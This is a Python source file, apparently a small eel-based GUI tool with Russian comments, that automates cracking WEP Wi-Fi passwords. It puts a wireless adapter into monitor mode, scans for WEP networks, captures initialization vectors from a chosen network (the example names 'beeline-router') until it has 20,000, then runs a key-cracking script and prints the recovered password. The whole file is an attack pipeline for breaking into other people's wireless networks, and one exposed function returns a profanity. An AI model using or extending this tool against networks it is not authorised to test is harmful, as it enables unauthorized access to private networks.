import eel    
import pandas as pd
import subprocess
import time
from io import StringIO
import os

# State
currentMonitorAdapter = "_no_adapter_"

isPollingNetworks = False
pollingProcess = 0

isDumpingNetwork = False
dumpingProcess = 0

networks = 0

# Const
framesNeeded = 20000
keySolveTimeout = 6
frameCheckTimeout = 1
wifiSearchTimeout = 5

def checkMonitorAdapter():
    return currentMonitorAdapter != "_no_adapter_"

# return exit code of child process
def Prepare() -> int:
    ok = subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    return ok

def GetAdapters():
    subprocess.run(["bash", "GetAdapters.sh"], stdout=open(os.devnull, 'w'))
    time.sleep(1)
    adaptersDf = pd.read_csv('adapters.txt', sep='\t', skipinitialspace=True)
    adapters = list(adaptersDf['Interface'])
    subprocess.run(['sudo', 'rm', 'adapters.txt'])

    return adapters

def SwitchMonitorMode(adapter : str):
    ok = subprocess.run(["bash", "StartAdapter.sh", adapter], stdout=open(os.devnull, 'w'))
    if ok:
        global currentMonitorAdapter
        currentMonitorAdapter = adapter + "mon"
    return ok

def StartWepNetworksSearching():
    if checkMonitorAdapter():
        process = subprocess.Popen(["sudo", "bash", "WepNetworkSearching.sh", currentMonitorAdapter], stdout=open(os.devnull, 'w'))

        global isPollingNetworks
        isPollingNetworks = True

        global pollingProcess
        pollingProcess = process
        return process

    return 0

def StopWepNetworksSearching():
    global isPollingNetworks
    isPollingNetworks = False

    global pollingProcess
    if pollingProcess != 0:
        pollingProcess.terminate()
        pollingProcess = 0

    return

def GetWepNetworks():
    if (checkMonitorAdapter()):
        networksDf = pd.read_csv('networks.temp-01.csv', sep=',', skipinitialspace=True)
        bssidList = list(networksDf["BSSID"])
        channelList = list(networksDf["channel"])
        ssidList = list(networksDf["ESSID"])

        listLen = bssidList.index('Station MAC')
        bssidList = bssidList[:listLen]
        channelList = channelList[:listLen]
        ssidList = ssidList[:listLen]

        outList = dict(zip(["BSSID", "Channel", "SSID"], [bssidList, channelList, ssidList]))



        return outList

    return []

def getNetworkParams(networkName : str):
    global networks

    i = networks["SSID"].index(networkName)
    bssid = networks["BSSID"][i]
    Channel = networks["Channel"][i]
    SSID = networks["SSID"][i]

    return dict(zip(["BSSID", "Channel", "SSID"], [bssid, Channel, SSID]))

def StartNetworkDumping(networkName : str):
    global isDumpingNetwork
    isDumpingNetwork = True
    network = getNetworkParams(networkName)

    global dumpingProcess
    dumpingProcess = subprocess.Popen(["bash", "StartDumping.sh", network["BSSID"], network["Channel"], currentMonitorAdapter], stdout=open(os.devnull, 'w'))
    return dumpingProcess

def StopNetworkDumping():
    global isDumpingNetwork
    isDumpingNetwork = False

    global dumpingProcess
    if dumpingProcess == 0:
        return

    dumpingProcess.terminate()
    dumpingProcess = 0

def GetFramesQuantity() -> int:
    with open('basic_wep.cap-01.csv', 'r') as file:
        lines = file.readlines()

    if lines == []:
        return 0
    # Предположим, что таблицы разделены пустой строкой
    table1_lines = []
    table2_lines = []
    table_switch = True  # Переключатель для определения, в какую таблицу добавлять строки
    lines = lines[1:]
    for line in lines:
        if line == "\n" and table_switch == True:  # Пустая строка
            table_switch = False # Переключаем таблицу
        elif table_switch:
            table1_lines.append(line)
        else:
            table2_lines.append(line)

    # Создание DataFrame для первой таблицы
    table1 = pd.read_csv(StringIO(''.join(table1_lines)), skipinitialspace=True)
    # tempList = [int(k) for k in table1["IV"]]
    return int(table1["# IV"][0])
    # Создание DataFrame для второй таблицы
    # table2 = pd.read_csv(StringIO(''.join(table2_lines)), skipinitialspace=True)

def GetNetworkKey():
    process = subprocess.Popen(["bash", "CrackKey.sh"], stdout=open(os.devnull, 'w'))

    time.sleep(keySolveTimeout)
    process.terminate()

    # if key exists return GetAsciiKey else return False
    try:
        with open('key.log', 'r') as file:
            key = file.readline()
    except:
        return ""

    keyStr = GetAsciiKey(key)
    return keyStr

def GetAsciiKey(hex_string : str) -> str:
    # Remove any spaces if present
    hex_string = hex_string.replace(" ", "")
    # Convert hex to bytes
    byte_array = bytes.fromhex(hex_string)
    # Decode bytes to string (assuming UTF-8 encoding)
    char_string = byte_array.decode('utf-8')
    return char_string


def CleanAllPosteffects():
    subprocess.run(["bash", "clean.sh", currentMonitorAdapter], stdout=open(os.devnull, 'w'))
    return


def GetFramesPercentage():
    global isDumpingNetwork
    if isDumpingNetwork:
        temp = int((100 * GetFramesQuantity()) / framesNeeded)
        if (temp <= 100):
            return temp
        else:
            return 100
    else:
        return 0

def GetNetworksNameList():
    global networks
    if (networks == 0):
        return []
    else:
        fullSSIDList = [network for network in networks["SSID"]]
        fullBSSIDList = [bssid for bssid in networks["BSSID"]]
        fullChannelList = [channel for channel in networks["Channel"]]
        tempSSIDList = []
        tempBSSIDList = []
        tempChannelList = []
        for network in fullSSIDList:
            if network == network:
                tempSSIDList.append(network)
                i = fullSSIDList.index(network)

                tempBSSIDList.append(fullBSSIDList[i])
                tempChannelList.append(fullChannelList[i])

        networks["BSSID"] = tempBSSIDList
        networks["SSID"] = tempSSIDList
        networks["Channel"] = tempChannelList

        return tempSSIDList



# Пример представлен ниже
def main():
    try:
        # Получаем список Wi-Fi адаптеров
        print('Получаем список Wi-Fi адаптеров')
        adapters = GetAdapters()
        print(adapters)
        # Переводим в режим мониторинга адаптер из списка
        print('Переводим в режим мониторинга адаптер из списка ', adapters[0])
        SwitchMonitorMode(adapters[0])
        # Начинаем процесс обнаружения Wi-Fi сетей
        print('Начинаем процесс обнаружения Wi-Fi сетей')
        StartWepNetworksSearching()
        print('Ожидание...')
        time.sleep(wifiSearchTimeout)
        # Завершаем процесс обнаружения Wi-Fi сетей
        print('Завершаем процесс обнаружения Wi-Fi сетей')
        print('\r', end='')
        StopWepNetworksSearching()
        # Получаем список WEP сетей
        print('Получаем список WEP сетей')
        print('\r', end='')
        global networks
        networks = GetWepNetworks()
        print(networks)
        print('Упрощённый вид')
        print(GetNetworksNameList())

        print('Начинаем дампить сеть beeline-router')
        StartNetworkDumping("beeline-router")
        time.sleep(frameCheckTimeout)

        framesReady = 0
        while (framesReady < framesNeeded):
            time.sleep(frameCheckTimeout)
            framesReady = GetFramesQuantity()
            print('Received IVs: ', framesReady, '\t', GetFramesPercentage(), '%', end='\r')

        print()
        StopNetworkDumping()

        keyStr = GetNetworkKey()
        if keyStr != "":
            print("The key is: ", keyStr, "\r")
        else:
            print("The key was not found. Try to capture more IVs")
    finally:
        StopWepNetworksSearching()
        StopNetworkDumping()
        CleanAllPosteffects()
        return


@eel.expose
def web_crack():
    # Получаем список Wi-Fi адаптеров
    print('Получаем список Wi-Fi адаптеров')
    adapters = GetAdapters()
    print(adapters)
    # Переводим в режим мониторинга адаптер из списка
    print('Переводим в режим мониторинга адаптер из списка ', adapters[0])
    SwitchMonitorMode(adapters[0])
    # Начинаем процесс обнаружения Wi-Fi сетей
    print('Начинаем процесс обнаружения Wi-Fi сетей')
    StartWepNetworksSearching()
    print('Ожидание...')
    time.sleep(wifiSearchTimeout)
    # Завершаем процесс обнаружения Wi-Fi сетей
    print('Завершаем процесс обнаружения Wi-Fi сетей')
    print('\r', end='')
    StopWepNetworksSearching()


@eel.expose
def get_list():
    print('get_list')
    global networks
    networks = GetWepNetworks()
    print(networks)
    print(GetNetworksNameList())
    return GetNetworksNameList()

currentSelectedNet = ""

@eel.expose
def get_select_nets(selected_net):
    global currentSelectedNet
    currentSelectedNet = selected_net
    print(f"Выбрано: {selected_net}"); # передается в формате строки
    print('Начинаем дампить сеть ', selected_net)
    StartNetworkDumping(selected_net)

    time.sleep(frameCheckTimeout)

@eel.expose
def send_progress():
    global frameCheckTimeout
    global framesNeeded
    framesReady = 0

    time.sleep(frameCheckTimeout)
    while (framesReady < framesNeeded):
        time.sleep(frameCheckTimeout)
        framesReady = GetFramesQuantity()
        print('Received IVs: ', framesReady, '\t', GetFramesPercentage(), '%', end='\r')
        eel.updateProgress(GetFramesPercentage(), 100)

    global currentSelectedNet

    keyStr = GetNetworkKey()
    if keyStr != "":
        print("The key is: ", keyStr, "\r")
    else:
        print("The key was not found. Try to capture more IVs")

    eel.finalUpdate(currentSelectedNet, keyStr)

    StopNetworkDumping()
    subprocess.run(['bash', 'RemoveNetCapture.sh'])


@eel.expose
def give_info():
    return "Fuck you"

if __name__ == '__main__':
    try:
        CleanAllPosteffects()
        eel.init('front')
        eel.start('index.html', mode="chrome", size=(760, 760))
    finally:
        StopWepNetworksSearching()
        StopNetworkDumping()

        CleanAllPosteffects()


# subprocess.run(['sudo'])
